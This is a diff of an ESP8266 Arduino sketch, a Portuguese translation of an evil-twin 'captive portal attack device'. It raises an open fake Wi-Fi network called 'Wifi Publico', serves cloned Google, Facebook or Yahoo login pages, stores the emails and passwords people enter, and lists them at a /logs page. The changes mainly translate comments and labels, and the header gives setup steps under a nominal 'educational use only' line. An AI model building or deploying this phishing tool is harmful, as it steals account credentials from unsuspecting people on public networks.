@@ -1,7 +1,7 @@
 /*
  * Criador Oficial Da Versão Brasileira Antonio Caleb.
- * Criador Oficial Da Versão Inglesa OxMarco (Dono Da Script).
- * Apos Ligar Irá Aparecer Sua Internet. Apos Conectar Abrir Seu Navegador Coloque Na Aba De Pesquisa Esse Endereço IP ("192.168.4.1/logs") Sem Aspas.
+ * Criador Oficial Da Versão Inglesa OxMarco.
+ * Apos Ligar Irá Aparecer o Wifi Fake. Apos Conectar Abrir Seu Navegador Coloque Na Aba De Pesquisa Esse Endereço IP ("192.168.4.1/admin") Sem Aspas.
  * (Apenas Para Uso Educacional)
  * Para Configurar As Paginas De Ataque, Fazer Uma Pasta Colocando O CalebCaptivePortal.Ino E Os Outros Com Nome Google.h Facebook.h Yahoo.h.
  * Apos Fazer A Pasta Abrir O Arquivo.Ino Já Pode Configrar As Paginas De Ataque.
@@ -36,7 +36,7 @@ const char *ssid="Wifi Publico";
 #define captivePortalPage GOOGLE_HTML
  // GOOGLE_HTML, FACEBOOK_HTML, YAHOO_HTML
 
-// Basic configuration using common network setups (usual DNS port, IP and web server port)
+// Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 4, 1);
 IPAddress netMsk(255, 255, 255, 0);
@@ -47,7 +47,7 @@ ESP8266WebServer webServer(80);
 String webString="";
 String serialString="";
 
-// Blink the builtin LED n times
+// Pisca o LED embutido n vezes
 void blink(int n)
 {
   for(int i = 0; i < n; i++)
@@ -66,7 +66,7 @@ void setup() {
   Serial.println("V2.0.0 - Caleb Captive Portal Attack Device");
   Serial.println();
 
-  // LED setup
+  // Config. Led
   pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, HIGH);  
 
@@ -145,7 +145,7 @@ void setup() {
 
   // Logging Page
   webServer.on("/logs", [](){
-    webString="<html><body><h1>Captured Logs</h1><br><pre>";
+    webString="<html><body><h1>Emails E Senhas Capturados</h1><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
     webString += serialString;
@@ -161,7 +161,7 @@ void setup() {
   webServer.on("/logs/clear", [](){
     webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
     File f = SPIFFS.open(LOGFILE, "w");
-    f.println("Captured Login Credentials:");
+    f.println("Logins Capturados:");
     f.close();
     webServer.send(200, "text/html", webString);
     Serial.println(serialString);
